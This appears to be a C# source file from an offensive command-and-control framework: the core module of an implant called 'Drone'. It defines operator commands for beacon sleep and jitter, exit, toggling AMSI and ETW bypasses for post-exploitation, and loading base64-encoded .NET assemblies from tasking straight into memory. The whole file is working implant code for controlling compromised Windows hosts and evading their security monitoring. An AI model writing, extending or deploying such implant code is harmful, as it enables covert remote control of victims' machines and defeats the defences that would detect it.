using System;
using System.Reflection;
using System.Threading;

using Drone.Models;

namespace Drone.Modules
{
    public class CoreModule : DroneModule
    {
        public override string Name { get; } = "core";
        
        public override void AddCommands()
        {
            var sleep = new Command("sleep", "Set sleep interval and jitter", SetSleep);
            sleep.Arguments.Add(new Command.Argument("interval", false));
            sleep.Arguments.Add(new Command.Argument("jitter"));

            var exit = new Command("exit", "Exit this Drone", ExitDrone);

            var amsi = new Command("bypass-amsi", "Bypass AMSI for post-ex tasks", BypassAmsi);
            amsi.Arguments.Add(new Command.Argument("true/false"));

            var etw = new Command("bypass-etw", "Bypass etw for post-ex tasks", BypassEtw);
            etw.Arguments.Add(new Command.Argument("true/false"));

            var load = new Command("load-module", "Load an external Drone module", LoadModule);
            load.Arguments.Add(new Command.Argument("/path/to/module.dll", false, true));

            Commands.Add(sleep);
            Commands.Add(load);
            Commands.Add(amsi);
            Commands.Add(etw);
            Commands.Add(exit);
        }

        private void SetSleep(DroneTask task, CancellationToken token)
        {
            Config.SetConfig("SleepInterval", Convert.ToInt32(task.Arguments[0]));
            
            if (task.Arguments.Length > 1)
                Config.SetConfig("SleepJitter", Convert.ToInt32(task.Arguments[1]));
        }

        private void BypassAmsi(DroneTask task, CancellationToken token)
        {
            if (task.Arguments.Length > 0)
                Config.SetConfig("BypassAmsi", bool.Parse(task.Arguments[0]));
            
            var current = Config.GetConfig<bool>("BypassAmsi");
            Drone.SendResult(task.TaskGuid, current.ToString());
        }

        private void BypassEtw(DroneTask task, CancellationToken token)
        {
            if (task.Arguments.Length > 0)
                Config.SetConfig("BypassEtw", bool.Parse(task.Arguments[0]));

            var current = Config.GetConfig<bool>("BypassEtw");
            Drone.SendResult(task.TaskGuid, current.ToString());
        }


        private void ExitDrone(DroneTask task, CancellationToken token)
        {
            Drone.Stop();
        }
        
        private void LoadModule(DroneTask task, CancellationToken token)
        {
            var bytes = Convert.FromBase64String(task.Artefact);
            var asm = Assembly.Load(bytes);
            
            Drone.LoadDroneModule(asm);
            Drone.SendResult(task.TaskGuid, $"Module {asm.GetName().Name} loaded.");
        }
    }
}